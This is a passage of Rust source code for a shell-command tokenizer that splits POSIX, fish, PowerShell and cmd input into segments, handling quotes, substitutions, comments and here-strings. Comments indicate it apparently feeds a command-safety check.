use serde::{Deserialize, Serialize};

/// Shell type for tokenization rules.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum ShellType {
    Posix,
    Fish,
    PowerShell,
    Cmd,
}

impl std::str::FromStr for ShellType {
    type Err = String;
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_lowercase().as_str() {
            "posix" | "bash" | "zsh" | "sh" => Ok(ShellType::Posix),
            "fish" => Ok(ShellType::Fish),
            "powershell" | "pwsh" => Ok(ShellType::PowerShell),
            "cmd" | "cmd.exe" => Ok(ShellType::Cmd),
            _ => Err(format!("unknown shell type: {s}")),
        }
    }
}

/// A segment of a tokenized command.
#[derive(Debug, Clone)]
pub struct Segment {
    /// The raw text of this segment.
    pub raw: String,
    /// The first word/command of this segment, if identifiable.
    pub command: Option<String>,
    /// Arguments following the command.
    pub args: Vec<String>,
    /// The separator that preceded this segment (e.g., `|`, `&&`).
    pub preceding_separator: Option<String>,
    /// Byte range of the *trimmed* segment content in the original input:
    /// `input[byte_range] == raw`. Lets downstream rules carve out per-segment
    /// spans. Production code derives it in `push_segment`.
    pub byte_range: std::ops::Range<usize>,
}

/// Tokenize a command string according to shell type.
pub fn tokenize(input: &str, shell: ShellType) -> Vec<Segment> {
    tokenize_bounded(input, shell, usize::MAX, usize::MAX, usize::MAX).0
}

/// Tokenize while retaining at most `max_segments` segments. The lexer still
/// consumes the full bounded input so quote and separator state remain correct,
/// but it does not allocate argv/raw storage for discarded segments.
pub(crate) fn tokenize_bounded(
    input: &str,
    shell: ShellType,
    max_segments: usize,
    max_words_per_segment: usize,
    max_word_bytes: usize,
) -> (Vec<Segment>, TokenizeBudget) {
    let limits = TokenizeLimits {
        max_segments,
        max_words_per_segment,
        max_word_bytes,
    };
    match shell {
        ShellType::Posix => tokenize_posix(input, true, SingleQuoteStyle::Posix, limits, None),
        ShellType::Fish => tokenize_fish(input, limits),
        ShellType::PowerShell => tokenize_powershell(input, limits),
        ShellType::Cmd => tokenize_cmd(input, limits),
    }
}

/// Where POSIX text reads differently in different shells, as the tokenizer
/// sees it outside single quotes and comments ([`posix_readings`]).
#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub(crate) struct PosixReadings {
    /// Byte offsets of each `'` that a backslash escapes inside a `$'...'`
    /// string. bash, zsh and ksh read one ANSI-C string there, where a
    /// backslash escapes the next character; dash reads a `$` and a plain
    /// single-quoted string, which that `'` closes, so the two read the text
    /// after it differently. In a backtick body this is the body as the
    /// shells unescape it (`\\'` there is `\'`). With these quotes replaced
    /// by a plain character, the tokenizer reads the text the way bash does.
    pub ansi_c_escaped_quotes: Vec<usize>,
    /// A run of two or more `$` before `{` or `(`, or a backslash-newline
    /// between `$`, `<` or `>` and `(` (or `$` and `{`). The shells disagree
    /// about where such a `${...}` or `$(...)` starts or ends.
    pub dollars_differ: bool,
}

/// [`PosixReadings`] for `input`. The text is read the way bash reads its
/// `$'...'` strings; up to the first `$'...'` that holds an escaped quote,
/// dash reads it the same way.
pub(crate) fn posix_readings(input: &str) -> PosixReadings {
    let mut readings = PosixReadings::default();
    let limits = TokenizeLimits {
        max_segments: 0,
        max_words_per_segment: 0,
        max_word_bytes: 0,
    };
    tokenize_posix(
        input,
        true,
        SingleQuoteStyle::Posix,
        limits,
        Some(&mut readings),
    );
    readings
}

#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub(crate) struct TokenizeBudget {
    pub segments_truncated: bool,
    pub words_truncated: bool,
    pub word_bytes_truncated: bool,
}

#[derive(Clone, Copy)]
struct TokenizeLimits {
    max_segments: usize,
    max_words_per_segment: usize,
    max_word_bytes: usize,
}

struct SegmentAccumulator {
    values: Vec<Segment>,
    limits: TokenizeLimits,
    budget: TokenizeBudget,
    defer_word_parsing: bool,
    single_quote_style: SingleQuoteStyle,
}

impl SegmentAccumulator {
    fn new(
        limits: TokenizeLimits,
        defer_word_parsing: bool,
        single_quote_style: SingleQuoteStyle,
    ) -> Self {
        Self {
            values: Vec::with_capacity(limits.max_segments.min(64)),
            limits,
            budget: TokenizeBudget::default(),
            defer_word_parsing,
            single_quote_style,
        }
    }

    fn is_full(&self) -> bool {
        self.values.len() >= self.limits.max_segments
    }

    fn mark_truncated(&mut self) {
        self.budget.segments_truncated = true;
    }

    fn note_word_budget(&mut self, budget: WordBudget) {
        self.budget.words_truncated |= budget.words_truncated;
        self.budget.word_bytes_truncated |= budget.word_bytes_truncated;
    }

    fn push(&mut self, segment: Segment) {
        debug_assert!(!self.is_full());
        self.values.push(segment);
    }

    fn finish(self) -> (Vec<Segment>, TokenizeBudget) {
        (self.values, self.budget)
    }
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum SingleQuoteStyle {
    Posix,
    Fish,
}

/// With `readings` (POSIX only), `$'...'` strings are read the way bash reads
/// them and the spots the shells read differently are noted there.
fn tokenize_posix(
    input: &str,
    bash_function_names: bool,
    single_quote_style: SingleQuoteStyle,
    limits: TokenizeLimits,
    mut readings: Option<&mut PosixReadings>,
) -> (Vec<Segment>, TokenizeBudget) {
    let mut segments = SegmentAccumulator::new(limits, false, single_quote_style);
    let mut current = String::new();
    let mut preceding_sep = None;
    let mut search_cursor: usize = 0;
    let chars: Vec<char> = input.chars().collect();
    let len = chars.len();
    // Byte offset of each character, for `readings` only.
    let byte_offsets: Vec<usize> = if readings.is_some() {
        input.char_indices().map(|(offset, _)| offset).collect()
    } else {
        Vec::new()
    };
    let mut i = 0;
    // A POSIX `#` begins a comment only at the start of a shell word. Keep
    // that lexical state explicitly: looking at the preceding source
    // character misclassifies both braces embedded in words and a newline
    // removed by backslash continuation.
    let mut at_word_start = true;
    // Control operators inside command/arithmetic/process substitutions,
    // subshells, and function/brace bodies are not top-level segment
    // boundaries. Keep a small lexical nesting state here; executable bodies
    // are recovered separately by `extract::executable_substitutions`.
    let mut paren_depth = 0usize;
    // `true` marks a `${...}` word scope; `false` marks a reserved-word brace
    // group. The distinction matters because parameter braces stay within the
    // current word while grouping braces start/end shell words.
    let mut brace_scopes: Vec<bool> = Vec::new();
    // POSIX only (fish has neither `${...}` nor backticks): which scope is
    // innermost decides what `#`, `(`, `)`, `{` and `}` are.
    // `brace_paren_depth[n]` is `paren_depth` when `brace_scopes[n]` opened,
    // so a `(` opened after a brace (still open) makes that paren the inner
    // scope. `backtick` holds `paren_depth`, the brace count and whether the
    // body sits in double quotes when a backtick body opened. The shells cut
    // a backtick body out at its first unescaped backtick before they parse
    // it, so nothing in the body (a quote included) runs past that backtick
    // or closes a scope opened before it, and a scope it leaves open ends
    // with it. Backticks do not change where segments split.
    let posix = single_quote_style == SingleQuoteStyle::Posix;
    let mut brace_paren_depth: Vec<usize> = Vec::new();
    let mut backtick: Option<(usize, usize, bool)> = None;
    // Reading double-quoted text. In POSIX double quotes a `$(` and a
    // backtick open a body the shells read as code, with its own quotes
    // (`"$(echo '"')"` is one word); the double-quoted text resumes after
    // its closer. `double_quoted_parens` holds, for each `$(` opened in
    // double quotes, `paren_depth` from before it opened.
    let mut in_double = false;
    let mut double_quoted_parens: Vec<usize> = Vec::new();
    // The last unescaped character read at a token position, with the index
    // just past it, and the run of unescaped `$` that ends with it. The
    // shells remove a backslash-newline before they read tokens, so one in
    // between leaves both in place (`$\` + newline + `(cmd)` is `$(cmd)`).
    let mut previous: Option<(char, usize)> = None;
    let mut dollar_run = 0usize;

    while i < len {
        let ch = chars[i];
        let before = previous
            .filter(|(_, end)| *end == i)
            .map(|(previous, _)| previous);
        let dollars_before = if before == Some('$') { dollar_run } else { 0 };
        if posix {
            if ch == '\\' && chars.get(i + 1) == Some(&'\n') {
                if let Some((_, end)) = previous.as_mut().filter(|(_, end)| *end == i) {
                    *end = i + 2;
                }
            } else {
                dollar_run = if ch == '$' { dollars_before + 1 } else { 0 };
                previous = Some((ch, i + 1));
            }
            // Outside single quotes and comments (their text never comes
            // back to the top of this loop): a `$$` before `{` or `(`, or a
            // `$`, `<` or `>` split from its `(` (or `$` from its `{`) by a
            // backslash-newline.
            if let Some(readings) = readings.as_deref_mut() {
                let split = i >= 2 && chars[i - 1] == '\n' && chars[i - 2] == '\\';
                readings.dollars_differ |= match (ch, before) {
                    ('{' | '(', Some('$')) => dollars_before >= 2 || split,
                    ('(', Some('<' | '>')) => split,
                    _ => false,
                };
            }
        }
        if in_double {
            match ch {
                '"' => {
                    in_double = false;
                    current.push(ch);
                    at_word_start = false;
                    i += 1;
                    continue;
                }
                '\\' if i + 1 < len => {
                    current.push(chars[i]);
                    current.push(chars[i + 1]);
                    i += 2;
                    continue;
                }
                // The closing backtick of the body this text sits in: the
                // backtick arm below closes the body.
                '`' if posix && backtick.is_some() => in_double = false,
                '`' if posix => {
                    in_double = false;
                    backtick = Some((paren_depth, brace_scopes.len(), true));
                    current.push(ch);
                    at_word_start = true;
                    i += 1;
                    continue;
                }
                // `$(` after an odd run of `$` (`$$(` is the PID and a plain
                // `(` in every shell).
                '(' if posix && before == Some('$') && dollars_before % 2 == 1 => {
                    in_double = false;
                    double_quoted_parens.push(paren_depth);
                    paren_depth = paren_depth.saturating_add(1);
                    current.push(ch);
                    at_word_start = true;
                    i += 1;
                    continue;
                }
                _ => {
                    current.push(ch);
                    i += 1;
                    continue;
                }
            }
        }
        let parameter_innermost = posix
            && posix_parameter_is_innermost(
                paren_depth,
                &brace_scopes,
                &brace_paren_depth,
                backtick.map(|(_, braces, _)| braces),
            );
        // Control operators split segments only at the top level. A backtick
        // body opened in double quotes stays inside that one word, as it did
        // when the double-quoted text was read in one piece.
        let top_level = paren_depth == 0
            && brace_scopes.is_empty()
            && !backtick.is_some_and(|(_, _, double_quoted)| double_quoted);

        match ch {
            '\\' if i + 1 < len => {
                current.push(chars[i]);
                current.push(chars[i + 1]);
                if chars[i + 1] != '\n' {
                    at_word_start = false;
                }
                i += 2;
                continue;
            }
            // Single quotes: everything literal until the closing quote. In a
            // backtick body they also end at its first unescaped backtick
            // (the shells cut the body out there before they read its
            // quotes); `\\` and `` \` `` are escapes there.
            '\'' => {
                current.push(ch);
                i += 1;
                let in_backtick = posix && backtick.is_some();
                // With `readings`, a `'` after an odd run of `$` opens an
                // ANSI-C string, where a backslash escapes the next character
                // (`$'it\'s'` is one string). It also ends at the first
                // unescaped backtick of a backtick body.
                let ansi_c =
                    posix && readings.is_some() && before == Some('$') && dollars_before % 2 == 1;
                while i < len && chars[i] != '\'' {
                    if ansi_c && chars[i] == '\\' && i + 1 < len {
                        // The shells unescape a backtick body (`\\` to `\`)
                        // before they read it, so there a run of `n`
                        // backslashes leaves `n / 2` rounded up before a `'`,
                        // and an even run leaves a backtick unescaped.
                        let run = if in_backtick {
                            chars[i..].iter().take_while(|ch| **ch == '\\').count()
                        } else {
                            1
                        };
                        let escaped = match chars.get(i + run) {
                            Some('\'') => run.div_ceil(2) % 2 == 1,
                            Some('`') if in_backtick => run % 2 == 1,
                            Some(_) => !in_backtick,
                            None => false,
                        };
                        let take = if escaped { run + 1 } else { run };
                        if escaped && chars.get(i + run) == Some(&'\'') {
                            if let Some((readings, offset)) =
                                readings.as_deref_mut().zip(byte_offsets.get(i + run))
                            {
                                readings.ansi_c_escaped_quotes.push(*offset);
                            }
                        }
                        current.extend(&chars[i..i + take]);
                        i += take;
                        continue;
                    }
                    if in_backtick {
                        if chars[i] == '`' {
                            break;
                        }
                        if chars[i] == '\\' && matches!(chars.get(i + 1), Some('\\' | '`')) {
                            current.push(chars[i]);
                            current.push(chars[i + 1]);
                            i += 2;
                            continue;
                        }
                    }
                    if single_quote_style == SingleQuoteStyle::Fish
                        && chars[i] == '\\'
                        && i + 1 < len
                        && matches!(chars[i + 1], '\\' | '\'')
                    {
                        // Fish recognizes exactly two escapes inside single
                        // quotes: `\\` and `\'`. In particular, an escaped
                        // apostrophe does not terminate the quoted word.
                        current.push(chars[i]);
                        current.push(chars[i + 1]);
                        i += 2;
                        continue;
                    }
                    current.push(chars[i]);
                    i += 1;
                }
                if i < len && chars[i] == '\'' {
                    current.push(chars[i]);
                    i += 1;
                }
                at_word_start = false;
                continue;
            }
            // Double quotes: backslash escaping allowed inside. The text is
            // read at the top of the loop (`in_double`).
            '"' => {
                current.push(ch);
                in_double = true;
                at_word_start = false;
                i += 1;
                continue;
            }
            '#' if at_word_start => {
                let scope = if posix {
                    posix_hash_scope(parameter_innermost, backtick.is_some())
                } else {
                    HashScope::Comment
                };
                if scope == HashScope::Parameter {
                    // Inside `${...}` a `#` is part of the parameter word
                    // (`${x:- #}`), never a comment.
                    current.push(ch);
                    at_word_start = false;
                    i += 1;
                    continue;
                }
                // Comments are not argv and syntax inside them cannot affect
                // delimiter depth. Leave the newline for the normal segment
                // boundary arm so the following command is still analyzed.
                // A comment in a backtick body also ends at the closing
                // backtick, which the backtick arm then reads; an escaped
                // backtick does not close the body.
                while i < len && chars[i] != '\n' {
                    if scope == HashScope::CommentToBacktick {
                        if chars[i] == '`' {
                            break;
                        }
                        if chars[i] == '\\' && i + 1 < len && chars[i + 1] != '\n' {
                            i += 2;
                            continue;
                        }
                    }
                    i += 1;
                }
                continue;
            }
            // A backtick opens a command substitution, or closes the open one
            // (a nested backtick must be escaped, and the escape arm above
            // keeps `\`` together). The body starts a command, so a `#` first
            // in it is a comment. Closing the body drops every scope opened
            // inside it, and resumes the double-quoted text it sat in.
            '`' if posix => {
                match backtick.take() {
                    Some((parens, braces, double_quoted)) => {
                        paren_depth = parens;
                        brace_scopes.truncate(braces);
                        brace_paren_depth.truncate(braces);
                        while double_quoted_parens
                            .last()
                            .is_some_and(|depth| *depth >= parens)
                        {
                            double_quoted_parens.pop();
                        }
                        in_double = double_quoted;
                        at_word_start = false;
                    }
                    None => {
                        backtick = Some((paren_depth, brace_scopes.len(), false));
                        at_word_start = true;
                    }
                }
                current.push(ch);
                i += 1;
                continue;
            }
            // Inside `${...}` a `(` is a plain byte (`${x//(/_}`, `${x:-(}`)
            // unless it opens a `$(`, `$((`, `<(` or `>(`.
            '(' if parameter_innermost && !matches!(before, Some('$' | '<' | '>')) => {
                current.push(ch);
                at_word_start = false;
                i += 1;
                continue;
            }
            '(' => {
                paren_depth = paren_depth.saturating_add(1);
                current.push(ch);
                at_word_start = true;
                i += 1;
                continue;
            }
            // A `)` closes a paren only when a paren is the innermost scope:
            // inside `${...}` it is a plain byte, and a backtick body cannot
            // close a paren opened before it. Closing a `$(` opened in double
            // quotes resumes the double-quoted text.
            ')' if paren_depth > 0
                && !parameter_innermost
                && backtick.is_none_or(|(parens, _, _)| paren_depth > parens) =>
            {
                paren_depth -= 1;
                if double_quoted_parens.last() == Some(&paren_depth) {
                    double_quoted_parens.pop();
                    in_double = true;
                }
                current.push(ch);
                at_word_start = true;
                i += 1;
                continue;
            }
            '{' if (if posix {
                posix_dollars_open_parameter(dollars_before, parameter_innermost)
            } else {
                ends_with_unescaped_char(&current, '$', '\\')
            }) || (!parameter_innermost
                && posix_reserved_word_boundary_after(&chars, i)
                && ((!brace_scopes.is_empty() && at_word_start)
                    || opens_posix_brace_scope(
                        &current,
                        paren_depth,
                        bash_function_names,
                        single_quote_style,
                    ))) =>
            {
                let embedded_in_word = if posix {
                    posix_dollars_open_parameter(dollars_before, parameter_innermost)
                } else {
                    ends_with_unescaped_char(&current, '$', '\\')
                };
                brace_scopes.push(embedded_in_word);
                brace_paren_depth.push(paren_depth);
                current.push(ch);
                at_word_start = !embedded_in_word;
                i += 1;
                continue;
            }
            // A `}` closes `${...}` only when it is the innermost scope (a `}`
            // inside `${x:-$(echo })}` is a word of the `$(...)`), and no
            // brace scope opened before an open backtick body.
            '}' if brace_scopes.last().is_some_and(|embedded_in_word| {
                if *embedded_in_word {
                    !posix || parameter_innermost
                } else {
                    at_word_start && posix_reserved_word_boundary_after(&chars, i)
                }
            }) && backtick.is_none_or(|(_, braces, _)| braces < brace_scopes.len()) =>
            {
                let embedded_in_word = brace_scopes.pop().unwrap_or(false);
                brace_paren_depth.pop();
                current.push(ch);
                at_word_start = !embedded_in_word;
                i += 1;
                continue;
            }
            '|' if top_level => {
                if i + 1 < len && chars[i + 1] == '|' {
                    push_posix_segment(
                        &mut segments,
                        &current,
                        preceding_sep.take(),
                        input,
                        &mut search_cursor,
                    );
                    current.clear();
                    at_word_start = true;
                    preceding_sep = Some("||".to_string());
                    i += 2;
                    continue;
                } else if i + 1 < len && chars[i + 1] == '&' {
                    // |& (bash: pipe stderr too)
                    push_posix_segment(
                        &mut segments,
                        &current,
                        preceding_sep.take(),
                        input,
                        &mut search_cursor,
                    );
                    current.clear();
                    at_word_start = true;
                    preceding_sep = Some("|&".to_string());
                    i += 2;
                    continue;
                } else {
                    push_posix_segment(
                        &mut segments,
                        &current,
                        preceding_sep.take(),
                        input,
                        &mut search_cursor,
                    );
                    current.clear();
                    at_word_start = true;
                    preceding_sep = Some("|".to_string());
                    i += 1;
                    continue;
                }
            }
            '&' if top_level && i + 1 < len && chars[i + 1] == '&' => {
                push_posix_segment(
                    &mut segments,
                    &current,
                    preceding_sep.take(),
                    input,
                    &mut search_cursor,
                );
                current.clear();
                at_word_start = true;
                preceding_sep = Some("&&".to_string());
                i += 2;
                continue;
            }
            // POSIX/Fish single `&` terminates an asynchronous command. Keep
            // fd-duplication and combined-redirection forms (`2>&1`, `0<&1`,
            // `&>file`) inside the current segment.
            '&' if top_level
                && !ends_with_unescaped_redirection(&current, '\\')
                && !(i + 1 < len && chars[i + 1] == '>') =>
            {
                push_posix_segment(
                    &mut segments,
                    &current,
                    preceding_sep.take(),
                    input,
                    &mut search_cursor,
                );
                current.clear();
                at_word_start = true;
                preceding_sep = Some("&".to_string());
                i += 1;
                continue;
            }
            ';' if top_level => {
                push_posix_segment(
                    &mut segments,
                    &current,
                    preceding_sep.take(),
                    input,
                    &mut search_cursor,
                );
                current.clear();
                at_word_start = true;
                preceding_sep = Some(";".to_string());
                i += 1;
                continue;
            }
            '\n' if top_level => {
                push_posix_segment(
                    &mut segments,
                    &current,
                    preceding_sep.take(),
                    input,
                    &mut search_cursor,
                );
                current.clear();
                at_word_start = true;
                preceding_sep = Some("\n".to_string());
                i += 1;
                continue;
            }
            _ => {
                current.push(ch);
                at_word_start = match ch {
                    ' ' | '\t' | '\n' => true,
                    // Control/redirection operators begin a new shell word
                    // even when they occur inside a nested lexical scope.
                    ';' | '&' | '|' | '<' | '>' => true,
                    _ => false,
                };
                i += 1;
            }
        }
    }

    push_posix_segment(
        &mut segments,
        &current,
        preceding_sep.take(),
        input,
        &mut search_cursor,
    );
    segments.finish()
}

/// What a word-start `#` is in [`tokenize_posix`], by its innermost scope.
#[derive(Clone, Copy, PartialEq, Eq)]
enum HashScope {
    /// A comment to the end of the line: top level, a `(`/`$(` body or a
    /// brace group.
    Comment,
    /// A comment in a backtick body: it ends at the end of the line or at
    /// the closing backtick, whichever comes first (`` `echo a #x` ; cmd ``
    /// runs `cmd`). The shells cut the body out at that backtick before they
    /// parse it, so this holds in a `(...)` inside the body too.
    CommentToBacktick,
    /// Part of a `${...}` word: no comment (`${x:- #} ; cmd` runs `cmd`).
    Parameter,
}

fn posix_hash_scope(parameter_innermost: bool, backtick_open: bool) -> HashScope {
    if parameter_innermost {
        HashScope::Parameter
    } else if backtick_open {
        HashScope::CommentToBacktick
    } else {
        HashScope::Comment
    }
}

/// Whether an open `${...}` is the innermost scope of [`tokenize_posix`]: no
/// paren opened after it, and no backtick body opened after it.
/// `brace_paren_depth[n]` is the paren depth when `brace_scopes[n]` opened;
/// `backtick_braces` is the brace count when the open backtick body started.
fn posix_parameter_is_innermost(
    paren_depth: usize,
    brace_scopes: &[bool],
    brace_paren_depth: &[usize],
    backtick_braces: Option<usize>,
) -> bool {
    brace_scopes.last() == Some(&true)
        && brace_paren_depth
            .last()
            .is_some_and(|parens| paren_depth <= *parens)
        && backtick_braces.is_none_or(|braces| braces < brace_scopes.len())
}

/// Whether a `{` after `dollars` unescaped `$` opens a `${...}`. Outside
/// `${...}`, bash, dash and ksh read `$$` as one parameter (the PID), so
/// `$${x` is `$$` and a plain `{x`; an odd run ends in `${`. zsh reads `$${x`
/// as `$` and `${x`, and inside `${...}` bash 3.2 and ksh do too, while bash
/// 5 and dash do not, so inside `${...}` any run opens one. The exec gate
/// fails closed on the even runs where the shells disagree
/// (`extract::lexical_executable_substitutions_bounded`).
fn posix_dollars_open_parameter(dollars: usize, parameter_innermost: bool) -> bool {
    dollars > 0 && (parameter_innermost || dollars % 2 == 1)
}

/// Whether the current token really ends in a redirection operator.  Looking
/// only at the final character confuses an escaped literal (`\\>` in POSIX,
/// `` `> `` in PowerShell) with syntax and can hide an adjacent `&` command
/// boundary.
fn ends_with_unescaped_redirection(raw: &str, escape: char) -> bool {
    raw.chars().next_back().is_some_and(|last| {
        matches!(last, '>' | '<') && ends_with_unescaped_char(raw, last, escape)
    })
}

fn ends_with_unescaped_char(raw: &str, expected: char, escape: char) -> bool {
    let mut chars = raw.chars().rev();
    let Some(last) = chars.next() else {
        return false;
    };
    if last != expected {
        return false;
    }
    let escapes = chars.take_while(|ch| *ch == escape).count();
    escapes % 2 == 0
}

fn is_posix_syntax_whitespace(ch: char) -> bool {
    matches!(ch, ' ' | '\t' | '\n')
}

fn posix_reserved_word_boundary_after(chars: &[char], index: usize) -> bool {
    chars.get(index + 1).is_none_or(|next| {
        is_posix_syntax_whitespace(*next)
            || matches!(next, ';' | '&' | '|' | '(' | ')' | '<' | '>' | '{' | '}')
    })
}

fn opens_posix_brace_scope(
    current: &str,
    paren_depth: usize,
    bash_function_names: bool,
    single_quote_style: SingleQuoteStyle,
) -> bool {
    let trimmed = current.trim_end_matches(is_posix_syntax_whitespace);
    if trimmed.is_empty()
        || (paren_depth > 0
            && trimmed
                .chars()
                .last()
                .is_some_and(|ch| matches!(ch, '(' | ';' | '&' | '|')))
    {
        return true;
    }

    let words = split_words_with_style(trimmed, single_quote_style);
    if words
        .first()
        .is_some_and(|word| word.eq_ignore_ascii_case("coproc"))
        && words.len() <= 2
    {
        // Bash named coprocess: `coproc NAME { command; }`.
        return true;
    }

    looks_like_posix_function_header(trimmed, bash_function_names)
}

fn looks_like_posix_function_header(raw: &str, bash_function_names: bool) -> bool {
    fn strip_continued_keyword<'a>(raw: &'a str, keyword: &[u8]) -> Option<&'a str> {
        let bytes = raw.as_bytes();
        let mut input_index = 0usize;
        let mut keyword_index = 0usize;
        while keyword_index < keyword.len() {
            while bytes.get(input_index) == Some(&b'\\')
                && bytes.get(input_index + 1) == Some(&b'\n')
            {
                input_index += 2;
            }
            if bytes.get(input_index) != keyword.get(keyword_index) {
                return None;
            }
            input_index += 1;
            keyword_index += 1;
        }
        while bytes.get(input_index) == Some(&b'\\') && bytes.get(input_index + 1) == Some(&b'\n') {
            input_index += 2;
        }
        raw.get(input_index..)
    }

    fn valid_name(name: &str, allow_equal: bool) -> bool {
        let name = name.replace("\\\n", "");
        !name.is_empty()
            && name.chars().all(|ch| {
                ch != '\0'
                    && !is_posix_syntax_whitespace(ch)
                    && !matches!(ch, ';' | '&' | '|' | '<' | '>' | '(' | ')')
                    && (allow_equal || ch != '=')
            })
    }

    fn portable_name(name: &str) -> bool {
        let mut chars = name.chars();
        chars
            .next()
            .is_some_and(|ch| ch == '_' || ch.is_ascii_alphabetic())
            && chars.all(|ch| ch == '_' || ch.is_ascii_alphanumeric())
    }

    let trimmed = raw.trim_matches(is_posix_syntax_whitespace);
    let function_rest = if bash_function_names {
        strip_continued_keyword(trimmed, b"function")
    } else {
        trimmed.strip_prefix("function")
    };
    if let Some(rest) = function_rest.filter(|rest| {
        rest.as_bytes()
            .first()
            .is_some_and(|byte| matches!(byte, b' ' | b'\t'))
    }) {
        let rest = rest.trim_start_matches(is_posix_syntax_whitespace);
        let name = rest
            .strip_suffix("()")
            .unwrap_or(rest)
            .trim_end_matches(is_posix_syntax_whitespace);
        return if bash_function_names {
            valid_name(name, true)
        } else {
            portable_name(name)
        };
    }

    let Some(without_close) = trimmed.strip_suffix(')') else {
        return false;
    };
    let Some(open) = without_close.rfind('(') else {
        return false;
    };
    let name = without_close[..open].trim_end_matches(is_posix_syntax_whitespace);
    without_close[open + 1..]
        .trim_matches(is_posix_syntax_whitespace)
        .is_empty()
        && if bash_function_names {
            valid_name(name, true) && !is_env_assignment(name)
        } else {
            portable_name(name)
        }
}

fn tokenize_fish(input: &str, limits: TokenizeLimits) -> (Vec<Segment>, TokenizeBudget) {
    // Fish shares the control-operator grammar used by this bounded scanner,
    // but unlike POSIX it accepts `\'` and `\\` within single-quoted words.
    tokenize_posix(input, false, SingleQuoteStyle::Fish, limits, None)
}

/// Distinguish PowerShell's unary call operator from its postfix background
/// statement terminator.  The expression-leading cases keep `&` in the current
/// segment so executable script blocks can be recovered recursively.
pub(crate) fn powershell_ampersand_is_call(prefix: &str) -> bool {
    let trimmed = prefix.trim_end();
    if trimmed.is_empty() {
        return true;
    }
    if trimmed
        .as_bytes()
        .last()
        .is_some_and(|byte| b"=([{,;|".contains(byte))
    {
        return true;
    }

    // `return & command` and `throw & command` are expression-leading call
    // sites only when the keyword itself is the current statement.  Treating
    // any final data word named `return`/`throw` as syntax keeps a following
    // background command in the wrong segment (`Write-Output return & ...`).
    trimmed.eq_ignore_ascii_case("return") || trimmed.eq_ignore_ascii_case("throw")
}

fn powershell_block_comment_end(indexed: &[(usize, char)], start: usize) -> Option<usize> {
    if indexed.get(start).map(|(_, ch)| *ch) != Some('<')
        || indexed.get(start + 1).map(|(_, ch)| *ch) != Some('#')
    {
        return None;
    }
    let mut i = start + 2;
    while i + 1 < indexed.len() {
        if indexed.get(i).map(|(_, ch)| *ch) == Some('#')
            && indexed.get(i + 1).map(|(_, ch)| *ch) == Some('>')
        {
            return Some(i + 2);
        }
        i += 1;
    }
    None
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum PowerShellQuoteKind {
    Single,
    Double,
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum PowerShellTokenClass {
    Start,
    Generic,
    QuoteOnly,
}

impl PowerShellTokenClass {
    fn starts_special_token(self) -> bool {
        !matches!(self, Self::Generic)
    }
}

pub(crate) fn powershell_quote_kind(ch: char) -> Option<PowerShellQuoteKind> {
    match ch {
        '\'' | '\u{2018}' | '\u{2019}' | '\u{201a}' | '\u{201b}' => {
            Some(PowerShellQuoteKind::Single)
        }
        '"' | '\u{201c}' | '\u{201d}' | '\u{201e}' => Some(PowerShellQuoteKind::Double),
        _ => None,
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) struct PowerShellHereString {
    pub(crate) kind: PowerShellQuoteKind,
    pub(crate) content_start: usize,
    pub(crate) content_end: usize,
    pub(crate) end: usize,
}

fn is_powershell_horizontal_whitespace(ch: char) -> bool {
    ch.is_whitespace()
        && !matches!(
            ch,
            '\r' | '\n' | '\u{000b}' | '\u{000c}' | '\u{0085}' | '\u{2028}' | '\u{2029}'
        )
}

/// Parse one complete PowerShell here-string at `start`.
///
/// PowerShell accepts the same typographic quote classes as ordinary strings.
/// The opening marker may be followed by horizontal whitespace before its
/// mandatory physical newline, and the footer may use any scalar from the
/// opening quote's class (for example, `@\u{201c}` ... `\u{201d}@`).
pub(crate) fn powershell_here_string(raw: &str, start: usize) -> Option<PowerShellHereString> {
    if raw.as_bytes().get(start) != Some(&b'@') {
        return None;
    }

    let quote_start = start + 1;
    let quote = raw.get(quote_start..)?.chars().next()?;
    let kind = powershell_quote_kind(quote)?;
    let mut index = quote_start + quote.len_utf8();
    while let Some(ch) = raw.get(index..).and_then(|suffix| suffix.chars().next()) {
        if !is_powershell_horizontal_whitespace(ch) {
            break;
        }
        index += ch.len_utf8();
    }

    match raw.get(index..).and_then(|suffix| suffix.chars().next())? {
        '\n' => index += 1,
        '\r' => {
            index += 1;
            if raw.as_bytes().get(index) == Some(&b'\n') {
                index += 1;
            }
        }
        _ => return None,
    }
    let content_start = index;
    let mut at_line_start = true;

    while let Some(ch) = raw.get(index..).and_then(|suffix| suffix.chars().next()) {
        if at_line_start && powershell_quote_kind(ch) == Some(kind) {
            let after_quote = index + ch.len_utf8();
            if raw.as_bytes().get(after_quote) == Some(&b'@') {
                return Some(PowerShellHereString {
                    kind,
                    content_start,
                    content_end: index,
                    end: after_quote + 1,
                });
            }
        }

        index += ch.len_utf8();
        at_line_start = match ch {
            '\n' => true,
            '\r' => raw.as_bytes().get(index) != Some(&b'\n'),
            _ => false,
        };
    }
    None
}

fn powershell_stop_parsing_token(
    indexed: &[(usize, char)],
    index: usize,
    token_class: PowerShellTokenClass,
) -> bool {
    token_class.starts_special_token()
        && indexed.get(index).map(|(_, ch)| *ch) == Some('-')
        && indexed.get(index + 1).map(|(_, ch)| *ch) == Some('-')
        && indexed.get(index + 2).map(|(_, ch)| *ch) == Some('%')
        && indexed
            .get(index + 3)
            .map(|(_, ch)| *ch)
            .is_none_or(|next| {
                next.is_whitespace()
                    || matches!(next, '&' | '(' | ')' | ',' | ';' | '{' | '|' | '}')
            })
}

/// Split one PowerShell segment into effective lexical words while preserving
/// the segment's original spelling and byte range. PowerShell recognizes all
/// Unicode whitespace, and an unquoted/double-quoted backtick newline removes
/// both characters instead of creating a word boundary.
#[derive(Debug, Clone, Copy, Default)]
struct WordBudget {
    words_truncated: bool,
    word_bytes_truncated: bool,
    word_limit_reached: bool,
}

fn push_bounded_word_char(
    current: &mut String,
    overflowed: &mut bool,
    ch: char,
    max_word_bytes: usize,
    budget: &mut WordBudget,
) {
    if budget.word_limit_reached {
        budget.words_truncated = true;
        *overflowed = true;
        return;
    }
    if *overflowed {
        return;
    }
    if current.len().saturating_add(ch.len_utf8()) > max_word_bytes {
        current.clear();
        *overflowed = true;
